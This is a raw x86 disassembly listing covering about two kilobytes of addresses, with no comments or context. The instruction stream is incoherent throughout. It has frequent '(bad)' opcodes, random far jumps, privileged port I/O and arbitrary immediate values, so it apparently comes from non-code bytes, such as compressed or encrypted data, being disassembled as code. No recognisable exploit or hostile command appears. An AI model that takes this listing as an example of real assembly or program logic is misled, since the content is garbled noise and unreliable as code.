  41cbd0:	clc    
  41cbd1:	cmp    BYTE PTR [ecx+0x34],bh
  41cbd4:	cld    
  41cbd5:	mov    ch,0xd9
  41cbd7:	loopne 0x41cb73
  41cbd9:	retf   
  41cbda:	jmp    0x4308:0xe3164fc6
  41cbe1:	inc    edx
  41cbe2:	and    BYTE PTR [ecx+0x58],al
  41cbe5:	rcr    ebx,0x0
	...
  41cbf4:	retf   0x76a0
  41cbf7:	dec    ebp
  41cbf8:	jle    0x41cbd9
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0xbe74bc5f,al
  41cc04:	pop    ebx
  41cc05:	mov    BYTE PTR [ecx],al
  41cc07:	add    BYTE PTR [ebx-0x31000000],ch
  41cc0d:	jl     0x41cbc0
  41cc0f:	sub    eax,0xfd0bafed
  41cc14:	push   ds
  41cc15:	cmovbe esp,DWORD PTR [edi+eax*4+0x64]
  41cc1a:	sar    ah,1
  41cc1c:	int3   
  41cc1d:	sub    eax,0x45c7f6f4
  41cc22:	jno    0x41cc6b
  41cc24:	jo     0x41cc85
  41cc26:	inc    edi
  41cc27:	(bad)  
  41cc28:	mov    esp,0x8aa2eaee
  41cc2d:	sti    
  41cc2e:	push   0x48
  41cc30:	jg     0x41cbdf
  41cc32:	jno    0x41cbfa
  41cc34:	and    cl,BYTE PTR [edx-0x518599e9]
  41cc3a:	cmp    eax,0x4e249043
  41cc3f:	or     DWORD PTR [ecx-0x21],ebp
  41cc42:	and    ah,BYTE PTR [ebx]
  41cc44:	jo     0x41cc76
  41cc46:	push   es
  41cc47:	dec    esp
  41cc48:	adc    ah,dl
  41cc4a:	in     al,dx
  41cc4b:	rcl    DWORD PTR [esi+0xa352819],0x0
  41cc52:	fwait
  41cc53:	retf   
  41cc54:	fs add eax,0xc69c338b
  41cc5a:	xchg   edi,eax
  41cc5b:	inc    esi
  41cc5c:	adc    DWORD PTR [ebx+eax*4-0x55eb753c],0xca2af24f
  41cc67:	sbb    eax,0xad1fe9b2
  41cc6c:	sti    
  41cc6d:	jg     0x41cc39
  41cc6f:	xor    DWORD PTR [ebp+0x471ebafb],esi
  41cc75:	fnstcw WORD PTR [edx+0x68e5610e]
  41cc7b:	or     dh,bl
  41cc7d:	cmp    eax,0x73d1adc0
  41cc82:	adc    al,0x2f
  41cc84:	fcomp  DWORD PTR [ebx+0x66]
  41cc87:	enter  0xae2e,0xc9
  41cc8b:	ret    0x32a4
  41cc8e:	addr16 sbb al,0x52
  41cc91:	push   0xffffff9e
  41cc93:	fst    DWORD PTR [eax+eiz*4+0x63f01275]
  41cc9a:	jns    0x41ccce
  41cc9c:	std    
  41cc9d:	adc    eax,0x5a93d197
  41cca2:	sbb    al,BYTE PTR [edx]
  41cca4:	push   ss
  41cca5:	pop    edx
  41cca6:	rcr    DWORD PTR [ecx-0x7d0b1a17],0x9e
  41ccad:	and    al,0x31
  41ccaf:	imul   DWORD PTR [ebx-0x1ec7597f]
  41ccb5:	mov    bh,0x85
	...
  41ccc3:	add    dh,al
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	int    0xc4
  41ccd2:	or     DWORD PTR [ecx+0x6],esp
  41ccd5:	mov    DWORD PTR [ecx],eax
  41ccd7:	add    BYTE PTR [ebx+0x16000000],ch
  41ccdd:	xor    al,0xd0
  41ccdf:	(bad)  
  41cce0:	out    0x28,eax
  41cce2:	test   BYTE PTR [ebx+edi*1],bh
  41cce5:	pop    esi
  41cce6:	mov    ebx,0x7d4aab2
  41cceb:	test   BYTE PTR [esi+0x7860c280],0xe6
  41ccf2:	xor    esp,ecx
  41ccf4:	mov    al,ds:0x12477748
  41ccf9:	jb     0x41cd5a
  41ccfb:	mov    ah,bh
  41ccfd:	pushf  
  41ccfe:	jb     0x41cd2c
  41cd00:	sbb    edi,0x4a0a4173
  41cd06:	sbb    al,0x4b
  41cd08:	in     al,0x69
  41cd0a:	xchg   edx,eax
  41cd0b:	fsubr  QWORD PTR [eax]
  41cd0d:	dec    edx
  41cd0e:	cs mov dl,0xa3
  41cd11:	inc    ebx
  41cd12:	jno    0x41cd3f
  41cd14:	mov    edx,DWORD PTR [edi-0x2e857ae6]
  41cd1a:	dec    ebp
  41cd1b:	and    BYTE PTR [ebx],ah
  41cd1d:	sub    BYTE PTR [edi+0x63fc1ed4],al
  41cd23:	xor    edx,DWORD PTR [eax-0x662e1c0]
  41cd29:	test   esp,ebp
  41cd2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd2c:	imul   edi,DWORD PTR [ebp-0x75],0x31
  41cd30:	addr16 mov ecx,0x5a75770a
  41cd36:	jmp    0x41cd98
  41cd38:	jle    0x41ccc7
  41cd3a:	outs   dx,BYTE PTR ds:[esi]
  41cd3b:	test   DWORD PTR [eax-0x2f],eax
  41cd3e:	clc    
  41cd3f:	push   ebx
  41cd40:	mov    dh,0x48
  41cd42:	out    0x12,al
  41cd44:	push   ebx
  41cd45:	mov    esi,0xf2179e8f
  41cd4a:	test   al,0xa6
  41cd4c:	icebp  
  41cd4d:	popf   
  41cd4e:	mov    bh,0x3e
  41cd50:	mov    ds:0x671b9822,eax
  41cd55:	mov    dh,0xce
  41cd57:	mov    edx,DWORD PTR [ecx-0x6df48559]
  41cd5d:	dec    ebx
  41cd5e:	and    ah,BYTE PTR [edx+esi*1-0x79]
  41cd62:	jmp    0x41cd63
  41cd64:	gs retf 0xb1db
  41cd68:	push   es
  41cd69:	jnp    0x41cd5e
  41cd6b:	loope  0x41cdb1
  41cd6d:	pop    es
  41cd6e:	xor    BYTE PTR [ebp-0x4f5ad86b],bl
  41cd74:	xor    esi,DWORD PTR [ecx]
  41cd76:	jb     0x41cd96
  41cd78:	in     eax,0x77
  41cd7a:	xor    al,0xf
  41cd7c:	xor    ah,bh
  41cd7e:	rcr    BYTE PTR [esi-0x5d360517],cl
  41cd84:	add    BYTE PTR [esi+0x2a],bl
	...
  41cd93:	add    BYTE PTR [edx+0x34],dl
  41cd96:	inc    eax
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0xb96a4e09
  41cda1:	xor    BYTE PTR [ecx+0x16],ah
  41cda4:	mov    cl,0x89
  41cda6:	add    DWORD PTR [eax],eax
  41cda8:	stos   DWORD PTR es:[edi],eax
  41cda9:	add    BYTE PTR [eax],al
  41cdab:	add    BYTE PTR [ebp-0x3d4705f7],dh
  41cdb1:	push   edx
  41cdb2:	mov    dl,0x34
  41cdb4:	sbb    DWORD PTR ds:0xc9379075,ebp
  41cdba:	mov    eax,0x6c61e426
  41cdbf:	cmp    BYTE PTR [ebx],bl
  41cdc1:	mov    bh,al
  41cdc3:	or     DWORD PTR [esi-0xc],esp
  41cdc6:	xor    al,0x68
  41cdc8:	repz and BYTE PTR [edx+0x5b],bl
  41cdcc:	cmp    eax,0xa9a4e8cd
  41cdd1:	dec    edx
  41cdd2:	dec    edx
  41cdd3:	mov    esi,0x2a5e6c81
  41cdd8:	dec    ecx
  41cdd9:	(bad)  
  41cddb:	or     eax,0x936bf763
  41cde0:	mov    eax,ds:0x875bf669
  41cde5:	jne    0x41cd9f
  41cde7:	dec    edi
  41cde8:	xchg   ebx,eax
  41cde9:	test   BYTE PTR [edx*1-0x22baca33],0x94
  41cdf1:	popf   
  41cdf2:	pop    ss
  41cdf3:	xchg   ebx,eax
  41cdf4:	lds    esi,FWORD PTR [esp+ecx*1]
  41cdf7:	mov    dl,BYTE PTR [ebx]
  41cdf9:	test   al,0xb6
  41cdfb:	xchg   edi,eax
  41cdfc:	ret    
  41cdfd:	add    al,0x14
  41cdff:	sti    
  41ce00:	push   edx
  41ce01:	mov    edx,0x80177c80
  41ce06:	xor    al,0x9
  41ce08:	mov    DWORD PTR [ecx+edx*4-0x54],edi
  41ce0c:	jb     0x41cdee
  41ce0e:	and    eax,0x52ae4b0c
  41ce13:	fxtract 
  41ce15:	(bad)  
  41ce16:	inc    BYTE PTR [esi+0x5d]
  41ce19:	pop    edx
  41ce1a:	loopne 0x41ce7a
  41ce1c:	add    dh,BYTE PTR [esi]
  41ce1e:	outs   dx,DWORD PTR ds:[esi]
  41ce1f:	mov    edi,DWORD PTR [eax-0x45]
  41ce22:	xor    DWORD PTR [esi-0xacc2331],ebx
  41ce28:	mov    bl,BYTE PTR [ebx-0x39]
  41ce2b:	lods   al,BYTE PTR ds:[esi]
  41ce2c:	xchg   ebx,eax
  41ce2d:	xchg   esp,eax
  41ce2e:	jle    0x41cdd9
  41ce30:	sbb    bh,BYTE PTR [edi-0x3e1e5459]
  41ce36:	push   0xd5335563
  41ce3b:	imul   esi,DWORD PTR [edx-0x23],0xffffff85
  41ce3f:	cli    
  41ce40:	mov    dl,0x77
  41ce42:	enter  0xfc29,0x87
  41ce46:	jecxz  0x41ce70
  41ce48:	sub    esp,ecx
  41ce4a:	xchg   ebx,eax
  41ce4b:	imul   eax,DWORD PTR [edi+0x48],0x38
  41ce4f:	cmc    
  41ce50:	jbe    0x41ce79
  41ce52:	cli    
  41ce53:	call   0x80132a
	...
  41ce64:	dec    ecx
  41ce65:	inc    esi
  41ce66:	sub    BYTE PTR [eax],dh
  41ce68:	das    
  41ce69:	jle    0x41cec4
  41ce6b:	jg     0x41ce33
  41ce6d:	imul   esi,eax,0xffffffd5
  41ce70:	jb     0x41ce29
  41ce72:	dec    ebx
  41ce73:	xor    DWORD PTR [edi],edx
  41ce75:	stos   DWORD PTR es:[edi],eax
  41ce76:	add    DWORD PTR [eax],eax
  41ce78:	stos   DWORD PTR es:[edi],eax
  41ce79:	add    BYTE PTR [eax],al
  41ce7b:	add    ah,cl
  41ce7d:	or     BYTE PTR [ebx+0xd],0xdb
  41ce81:	icebp  
  41ce82:	inc    edi
  41ce83:	test   eax,0x8ea82b12
  41ce88:	mov    dh,0xfc
  41ce8a:	daa    
  41ce8b:	mov    ch,bh
  41ce8d:	adc    ebx,esi
  41ce8f:	fnstsw WORD PTR [ecx]
  41ce91:	repz sub BYTE PTR [esp+ecx*2],ah
  41ce95:	dec    ecx
  41ce96:	(bad)  
  41ce97:	stos   DWORD PTR es:[edi],eax
  41ce98:	int3   
  41ce99:	popf   
  41ce9a:	pop    edx
  41ce9b:	dec    ecx
  41ce9c:	lods   eax,DWORD PTR ds:[esi]
  41ce9d:	sub    al,0x34
  41ce9f:	pmaxub mm3,mm1
  41cea2:	xchg   DWORD PTR [ebx-0x6fef10b7],ebx
  41cea8:	or     edx,esp
  41ceaa:	mov    bh,0x49
  41ceac:	sbb    ebx,DWORD PTR [edi+0x78]
  41ceaf:	cli    
  41ceb0:	mov    ch,BYTE PTR [eax+0x6b078808]
  41ceb6:	retf   
  41ceb7:	gs mov ebx,0xe0206672
  41cebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cebe:	sbb    al,0x3e
  41cec0:	rcr    DWORD PTR [edx+0x10ed7fe2],0x4b
  41cec7:	push   ebx
  41cec8:	ins    DWORD PTR es:[edi],dx
  41cec9:	push   eax
  41ceca:	adc    DWORD PTR [edi+ebx*8-0x4b],eax
  41cece:	mov    ds:0x30d5b28a,al
  41ced3:	stc    
  41ced4:	(bad)  
  41ced5:	sbb    ah,BYTE PTR [ebx]
  41ced7:	cwde   
  41ced8:	popa   
  41ced9:	or     eax,0x7f15b86f
  41cede:	pusha  
  41cedf:	sub    eax,0x86a42dc2
  41cee4:	pushf  
  41cee5:	adc    BYTE PTR ds:0x588a8294,0xaf
  41ceec:	cmc    
  41ceed:	mov    eax,ds:0xfc10c273
  41cef2:	adc    dl,BYTE PTR [edi+0x6c]
  41cef5:	cwde   
  41cef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cef7:	stos   BYTE PTR es:[edi],al
  41cef8:	(bad)  
  41cef9:	sbb    dl,0x32
  41cefc:	add    DWORD PTR [edx],eax
  41cefe:	sbb    ecx,esp
  41cf00:	lock sahf 
  41cf02:	add    BYTE PTR [eax],dh
  41cf04:	pop    es
  41cf05:	cmc    
  41cf06:	jmp    DWORD PTR [edx+ebx*8+0x9]
  41cf0a:	push   es
  41cf0b:	mov    bl,0xf6
  41cf0d:	loope  0x41cf25
  41cf0f:	sbb    al,0x9b
  41cf11:	pop    eax
  41cf12:	push   0xf88a3f81
  41cf17:	(bad)
  41cf1a:	mov    ds:0x1814e217,al
  41cf1f:	leave  
  41cf20:	push   ss
  41cf21:	mov    eax,ds:0x4b486496
  41cf26:	fadd   QWORD PTR [eax]
	...
  41cf34:	addr16 (bad) 
  41cf36:	and    dh,dh
  41cf38:	mov    eax,ds:0xe7d7f7f6
  41cf3d:	mov    eax,0xce34da72
  41cf42:	jne    0x41cee6
  41cf44:	ret    0x1ab
  41cf47:	add    BYTE PTR [ebx-0x1f000000],ch
  41cf4d:	retf   
  41cf4e:	push   ecx
  41cf4f:	jbe    0x41cf80
  41cf51:	ins    DWORD PTR es:[edi],dx
  41cf52:	push   0x63
  41cf54:	mov    ah,0xda
  41cf56:	ss js  0x41cf19
  41cf59:	stos   DWORD PTR es:[edi],eax
  41cf5a:	idiv   DWORD PTR ds:0x5cbf862f
  41cf60:	xchg   esi,eax
  41cf61:	pushf  
  41cf62:	inc    dx
  41cf64:	jbe    0x41cf4c
  41cf66:	ret    
  41cf67:	push   ds
  41cf68:	fadd   DWORD PTR [edx-0x68]
  41cf6b:	add    DWORD PTR [edi+ecx*2],ebx
  41cf6e:	sbb    edx,esi
  41cf70:	jne    0x41cf1a
  41cf72:	xor    al,0xa4
  41cf74:	jp     0x41cf25
  41cf76:	stos   BYTE PTR es:[edi],al
  41cf77:	imul   edi,DWORD PTR [ebp+0x3a],0xae17c8b7
  41cf7e:	add    esp,esi
  41cf80:	std    
  41cf81:	test   al,0x9c
  41cf83:	dec    ecx
  41cf84:	mov    ebx,0x88448846
  41cf89:	imul   BYTE PTR [ebx]
  41cf8b:	rcr    DWORD PTR [eax],cl
  41cf8d:	into   
  41cf8e:	arpl   WORD PTR [ebp-0x6e8ad4f6],si
  41cf94:	ret    0x3c63
  41cf97:	adc    DWORD PTR [esi+0x6abd2bc5],esp
  41cf9d:	ds fwait
  41cf9f:	in     eax,dx
  41cfa0:	mov    al,0x59
  41cfa2:	ret    0x79bc
  41cfa5:	out    0x9a,eax
  41cfa7:	pusha  
  41cfa8:	sub    ebp,DWORD PTR [edx+0x7a10f04e]
  41cfae:	(bad)  
  41cfaf:	ret    0x9682
  41cfb2:	cld    
  41cfb3:	and    edx,edi
  41cfb5:	adc    ebp,DWORD PTR [edi+0x5ccf1fa0]
  41cfbb:	pop    edi
  41cfbc:	jmp    DWORD PTR [edx-0x6e01f775]
  41cfc2:	pavgw  mm4,mm1
  41cfc5:	in     al,dx
  41cfc6:	(bad)  
  41cfc7:	mov    ?,WORD PTR [edi]
  41cfc9:	fldenv [esi+0x5529657c]
  41cfcf:	retf   
  41cfd0:	out    dx,al
  41cfd1:	scas   al,BYTE PTR es:[edi]
  41cfd2:	(bad)  
  41cfd3:	pop    edi
  41cfd4:	jmp    0x3cc6:0xd8977f8c
  41cfdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfdc:	pop    esp
  41cfdd:	sti    
  41cfde:	jge    0x41cff9
  41cfe0:	shl    DWORD PTR [edx],1
  41cfe2:	mov    ebp,0x7e2c95bd
  41cfe7:	add    esi,ebx
  41cfe9:	xchg   edx,eax
  41cfea:	or     edi,ebx
  41cfec:	and    esi,ebx
  41cfee:	mov    edi,ss
  41cff0:	sub    ebx,DWORD PTR [edx+ebx*2-0x30440b1e]
	...
  41d003:	add    bl,al
  41d005:	or     eax,0xefee66a6
  41d00a:	ret    
  41d00b:	lods   eax,DWORD PTR ds:[esi]
  41d00c:	sub    al,0xb8
  41d00e:	mov    ds:0x79df247,eax
  41d013:	sbb    eax,0x1ac6d
  41d018:	stos   DWORD PTR es:[edi],eax
  41d019:	add    BYTE PTR [eax],al
  41d01b:	add    BYTE PTR [edx],dl
  41d01d:	adc    BYTE PTR [ebp+0x32e80246],bl
  41d023:	nop
  41d024:	push   eax
  41d025:	mov    ds:0xcfe5e7f2,eax
  41d02a:	add    ch,BYTE PTR [ebp-0x6a746bca]
  41d030:	dec    ecx
  41d031:	jecxz  0x41d011
  41d033:	inc    ebx
  41d034:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d035:	pop    eax
  41d036:	xchg   DWORD PTR [eax+0x41d6a335],esp
  41d03c:	dec    eax
  41d03d:	iret   
  41d03e:	test   eax,0x5613357d
  41d043:	jge    0x41d076
  41d045:	(bad)  
  41d046:	fwait
  41d047:	int3   
  41d048:	inc    esi
  41d049:	mov    ebp,DWORD PTR [ebx]
  41d04b:	push   eax
  41d04c:	mov    ecx,0x96f4875f
  41d051:	sbb    BYTE PTR [esp+ebp*4],bl
  41d054:	sbb    DWORD PTR [ecx+edx*4-0x65],0x76e7fd1b
  41d05c:	(bad)  
  41d05d:	lods   eax,DWORD PTR ds:[esi]
  41d05e:	or     al,0x8
  41d060:	jne    0x41d011
  41d062:	mov    ds,ebx
  41d064:	(bad)  
  41d065:	outs   dx,BYTE PTR ds:[esi]
  41d066:	add    bl,BYTE PTR [ebp+0x7a]
  41d069:	leave  
  41d06a:	or     BYTE PTR [esi-0x4f537b6f],0xa2
  41d071:	(bad)  [ebx+edx*2]
  41d074:	arpl   WORD PTR [ebp+ebp*2-0x11],ax
  41d078:	mov    edx,0xe26ee416
  41d07d:	adc    eax,0x5f89374f
  41d082:	ss mov bl,0xaa
  41d085:	push   esp
  41d086:	adc    eax,eax
  41d088:	je     0x41d073
  41d08a:	pop    ds
  41d08b:	adc    al,0xa9
  41d08d:	dec    ecx
  41d08e:	aas    
  41d08f:	popa   
  41d090:	inc    ebp
  41d091:	cld    
  41d092:	lds    edi,FWORD PTR [ebp+0x70ec5935]
  41d098:	arpl   WORD PTR [ebp-0x50977ef],cx
  41d09e:	retf   
  41d09f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0a0:	adc    eax,0xe1280e78
  41d0a5:	loope  0x41d06a
  41d0a7:	cmp    al,0x2
  41d0a9:	stc    
  41d0aa:	xor    DWORD PTR [ebx+0x4d02d640],esi
  41d0b0:	push   cs
  41d0b1:	scas   al,BYTE PTR es:[edi]
  41d0b2:	ror    DWORD PTR [ecx+0x5074e518],cl
  41d0b8:	ja     0x41d07d
  41d0ba:	push   ds
  41d0bb:	or     bl,ah
  41d0bd:	popf   
  41d0be:	into   
  41d0bf:	icebp  
  41d0c0:	pop    ebp
  41d0c1:	out    0x77,eax
  41d0c3:	pop    ebp
  41d0c4:	jle    0x41d05f
  41d0c6:	cmp    al,BYTE PTR [eax]
	...
  41d0d4:	fld    st(2)
  41d0d6:	add    eax,0xddcf1f49
  41d0db:	ror    al,cl
  41d0dd:	outs   dx,DWORD PTR ds:[esi]
  41d0de:	clc    
  41d0df:	rol    al,cl
  41d0e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0e2:	and    edi,DWORD PTR [edx+0x1ad18]
  41d0e8:	stos   DWORD PTR es:[edi],eax
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    BYTE PTR [eax-0x5c],cl
  41d0ee:	add    BYTE PTR [edx+0x40],bl
  41d0f1:	add    DWORD PTR [ebp-0x359b9087],esi
  41d0f7:	pop    es
  41d0f8:	out    0x33,eax
  41d0fa:	adc    BYTE PTR [ebx+0x3f],dl
  41d0fd:	or     DWORD PTR [esi],0x50c9341f
  41d103:	jb     0x200e8c48
  41d109:	mov    al,0xb1
  41d10b:	or     BYTE PTR [ebx+0x211a4da8],dl
  41d111:	es jo  0x41d0d2
  41d114:	adc    eax,0xe892a244
  41d119:	daa    
  41d11a:	mov    ebp,0x7a159b15
  41d11f:	(bad)  [ecx+0x48]
  41d122:	neg    ecx
  41d124:	mov    eax,0xfd3110b8
  41d129:	cdq    
  41d12a:	adc    bl,ah
  41d12c:	cmp    DWORD PTR [eax],ebx
  41d12e:	xlat   BYTE PTR ds:[ebx]
  41d12f:	or     al,dl
  41d131:	je     0x41d0c5
  41d133:	lock mov ch,0x12
  41d136:	leave  
  41d137:	add    eax,0x9e45b49c
  41d13c:	outs   dx,DWORD PTR ds:[esi]
  41d13d:	aaa    
  41d13e:	imul   esp,DWORD PTR [edx-0x3055f1ae],0x43ccaa8b
  41d148:	int    0xe8
  41d14a:	or     al,0xfc
  41d14c:	sub    BYTE PTR [ebx+eax*1-0xa],ah
  41d150:	jnp    0x41d12b
  41d152:	dec    ebp
  41d153:	les    edx,FWORD PTR [eax]
  41d155:	pmaddwd mm2,QWORD PTR [eax-0x6b914e81]
  41d15c:	add    edx,DWORD PTR [ebp-0xb250fb2]
  41d162:	dec    eax
  41d163:	jbe    0x41d0fa
  41d165:	jecxz  0x41d1b0
  41d167:	or     eax,0xb2da5ce4
  41d16c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d16d:	repnz imul esi,DWORD PTR ds:0x9f0fc93d,0xffffffe7
  41d175:	or     DWORD PTR [eax+edi*2],esp
  41d178:	push   ecx
  41d179:	repnz and ecx,DWORD PTR [ecx-0x31]
  41d17d:	retf   0x27cc
  41d180:	aaa    
  41d181:	loopne 0x41d13e
  41d183:	retf   0x23b5
  41d186:	sti    
  41d187:	daa    
  41d188:	out    0x5c,al
  41d18a:	jns    0x41d1fd
  41d18c:	dec    esi
  41d18d:	cwde   
  41d18e:	out    0x75,al
  41d190:	push   eax
  41d191:	jmp    FWORD PTR [esi+0x52dc91d8]
	...
  41d1a3:	add    BYTE PTR [ecx+0x5f],ah
  41d1a6:	lock (bad) 
  41d1a8:	(bad)  
  41d1a9:	out    dx,eax
  41d1aa:	repz pop edi
  41d1ac:	mov    dl,0xc5
  41d1ae:	ret    
  41d1af:	in     eax,dx
  41d1b0:	xor    esi,DWORD PTR [edx-0xb]
  41d1b3:	inc    edi
  41d1b4:	ret    
  41d1b5:	lods   eax,DWORD PTR ds:[esi]
  41d1b6:	add    DWORD PTR [eax],eax
  41d1b8:	adc    al,BYTE PTR [eax]
  41d1ba:	add    BYTE PTR [eax],al
  41d1bc:	jbe    0x41d140
  41d1be:	mov    esp,0x8813df12
  41d1c3:	loop   0x41d1e7
  41d1c5:	add    BYTE PTR [eax],ch
  41d1c7:	xchg   edx,eax
  41d1c8:	in     al,0x13
  41d1ca:	and    DWORD PTR [ecx],edx
  41d1cc:	add    eax,0xe5
  41d1d1:	add    BYTE PTR [eax],al
  41d1d3:	add    BYTE PTR [eax],al
  41d1d5:	pusha  
  41d1d6:	inc    edx
  41d1d7:	add    BYTE PTR [eax+eiz*2],al
  41d1da:	inc    edx
  41d1db:	add    BYTE PTR [eax],cl
  41d1dd:	pusha  
  41d1de:	inc    edx
  41d1df:	add    BYTE PTR [eax+eiz*2],cl
  41d1e2:	inc    edx
  41d1e3:	add    BYTE PTR [eax],dl
  41d1e5:	pusha  
  41d1e6:	inc    edx
  41d1e7:	add    BYTE PTR [eax+eiz*2],dl
  41d1ea:	inc    edx
  41d1eb:	add    BYTE PTR [eax],bl
  41d1ed:	pusha  
  41d1ee:	inc    edx
  41d1ef:	add    BYTE PTR [eax+eiz*2],bl
  41d1f2:	inc    edx
  41d1f3:	add    BYTE PTR [eax],al
  41d1f5:	jo     0x41d239
  41d1f7:	add    BYTE PTR [eax+esi*2],al
  41d1fa:	inc    edx
  41d1fb:	add    BYTE PTR [eax],cl
  41d1fd:	jo     0x41d241
  41d1ff:	add    BYTE PTR [eax+esi*2],cl
  41d202:	inc    edx
  41d203:	add    BYTE PTR [eax],dl
  41d205:	jo     0x41d249
  41d207:	add    BYTE PTR [eax+esi*2],dl
  41d20a:	inc    edx
  41d20b:	add    BYTE PTR [eax],bl
  41d20d:	jo     0x41d251
  41d20f:	add    BYTE PTR [eax+esi*2],bl
  41d212:	inc    edx
  41d213:	add    BYTE PTR [eax],al
  41d215:	add    BYTE PTR [edx+0x0],0x4
  41d219:	add    BYTE PTR [edx+0x0],0x8
  41d21d:	add    BYTE PTR [edx+0x0],0xc
  41d221:	add    BYTE PTR [edx+0x0],0x10
  41d225:	add    BYTE PTR [edx+0x0],0x14
  41d229:	add    BYTE PTR [edx+0x0],0x18
  41d22d:	add    BYTE PTR [edx+0x0],0x1c
  41d231:	add    BYTE PTR [edx+0x0],0x78
  41d235:	data16 ins BYTE PTR es:[edi],dx
  41d237:	jp     0x41d290
  41d239:	jbe    0x41d282
  41d23b:	ja     0x41d280
  41d23d:	js     0x41d287
  41d23f:	jno    0x41d291
  41d241:	arpl   WORD PTR [ebx+0x6f],dx
  41d244:	inc    edi
  41d245:	dec    esi
  41d246:	outs   dx,DWORD PTR ds:[esi]
  41d247:	pop    ecx
  41d248:	inc    edi
  41d249:	jb     0x41d292
  41d24b:	jns    0x41d2c3
  41d24d:	inc    ecx
  41d24e:	pop    eax
  41d24f:	dec    esp
  41d250:	add    BYTE PTR [eax],al
  41d252:	add    BYTE PTR [eax],al
  41d254:	(bad)  
  41d256:	inc    ecx
  41d257:	add    ah,ah
  41d259:	aad    0x41
  41d25b:	add    BYTE PTR [esp+edx*8+0xbef0041],bl
  41d262:	mov    dl,0xe
  41d264:	jns    0x41d2b4
  41d266:	xor    BYTE PTR [esi-0x79],cl
  41d269:	dec    edi
  41d26a:	cmp    eax,0x3e4faf4e
  41d26f:	dec    esi
  41d270:	js     0x41d2c0
  41d272:	cmp    ecx,DWORD PTR [esi-0x64]
  41d275:	dec    edi
  41d276:	inc    esp
  41d277:	dec    esi
  41d278:	jae    0x41d2c8
  41d27a:	inc    ecx
  41d27b:	dec    esi
  41d27c:	xor    BYTE PTR [esi+0x40],cl
  41d27f:	dec    esi
  41d280:	pop    esp
  41d281:	pop    ebp
  41d282:	pop    edi
  41d283:	push   edx
  41d284:	cmp    DWORD PTR [esi+0x79],ecx
  41d287:	dec    esi
  41d288:	xor    BYTE PTR [esi-0x79],cl
  41d28b:	dec    edi
  41d28c:	cmp    eax,0x3e4faf4e
  41d291:	dec    esi
  41d292:	js     0x41d2e2
  41d294:	cmp    ecx,DWORD PTR [esi-0x64]
  41d297:	dec    edi
  41d298:	inc    esp
  41d299:	dec    esi
  41d29a:	mov    DWORD PTR [edi+0x41],ecx
  41d29d:	dec    esi
  41d29e:	xor    BYTE PTR [esi+0x40],cl
  41d2a1:	dec    esi
  41d2a2:	pop    esp
  41d2a3:	ins    DWORD PTR es:[edi],dx
  41d2a4:	pop    edi
  41d2a5:	bound  edi,QWORD PTR [ecx]
  41d2a7:	dec    esi
  41d2a8:	jns    0x41d2f8
  41d2aa:	xor    BYTE PTR [esi-0x80],cl
  41d2ad:	dec    edi
  41d2ae:	cmp    eax,0x394e734e
  41d2b3:	dec    esi
  41d2b4:	mov    ds:0x304e3a4f,al
  41d2b9:	dec    esi
  41d2ba:	inc    esi
  41d2bb:	dec    esi
  41d2bc:	pop    esp
  41d2bd:	jge    0x41d31e
  41d2bf:	jb     0x41d330
  41d2c1:	sub    BYTE PTR [esi-0x7d],0x7e
  41d2c5:	xchg   ebx,eax
  41d2c6:	jns    0x41d258
  41d2c8:	aas    
  41d2c9:	dec    esi
  41d2ca:	test   BYTE PTR [edi+0x30],cl
  41d2cd:	dec    esi
  41d2ce:	test   BYTE PTR [edi+0x3c],cl
  41d2d1:	dec    esi
  41d2d2:	mov    ds:0x734e394f,al
  41d2d7:	dec    esi
  41d2d8:	inc    ebp
  41d2d9:	dec    esi
  41d2da:	xor    BYTE PTR [esi+0x44],cl
  41d2dd:	dec    esi
  41d2de:	pop    esp
  41d2df:	lea    ebx,[edi-0x7e]
  41d2e2:	outs   dx,DWORD PTR ds:[esi]
  41d2e3:	xchg   edx,eax
  41d2e4:	outs   dx,BYTE PTR ds:[esi]
  41d2e5:	xchg   ebx,eax
  41d2e6:	jle    0x41d28b
  41d2e8:	jns    0x41d28a
  41d2ea:	aas    
  41d2eb:	dec    esi
  41d2ec:	test   BYTE PTR [edi+0x30],cl
  41d2ef:	dec    esi
  41d2f0:	test   BYTE PTR [edi+0x3c],cl
  41d2f3:	dec    esi
  41d2f4:	mov    ds:0x894e394f,al
  41d2f9:	dec    edi
  41d2fa:	inc    ebp
  41d2fb:	dec    esi
  41d2fc:	xor    BYTE PTR [esi+0x44],cl
  41d2ff:	dec    esi
  41d300:	pop    esp
  41d301:	popf   
  41d302:	pop    edi
  41d303:	xchg   edx,eax
  41d304:	outs   dx,DWORD PTR ds:[esi]
  41d305:	mov    ds:0xb37ea36e,al
  41d30a:	jns    0x41d2bc
  41d30c:	aas    
  41d30d:	dec    esi
  41d30e:	mov    cs,WORD PTR [edi+0x30]
  41d311:	dec    esi
  41d312:	lods   al,BYTE PTR ds:[esi]
  41d313:	dec    edi
  41d314:	cmp    eax,0x394e734e
  41d319:	dec    esi
  41d31a:	mov    eax,ds:0x304e3a4f
  41d31f:	dec    esi
  41d320:	inc    esp
  41d321:	dec    esi
  41d322:	pop    esp
  41d323:	lods   eax,DWORD PTR ds:[esi]
  41d324:	pop    edi
  41d325:	mov    ds:0xb36eb26f,al
  41d32a:	jle    0x41d2ef
  41d32c:	jns    0x41d2ee
  41d32e:	aas    
  41d32f:	dec    esi
  41d330:	mov    cs,WORD PTR [edi+0x30]
  41d333:	dec    esi
  41d334:	lods   al,BYTE PTR ds:[esi]
  41d335:	dec    edi
  41d336:	cmp    eax,0x394e7e4e
  41d33b:	dec    esi
  41d33c:	lahf   
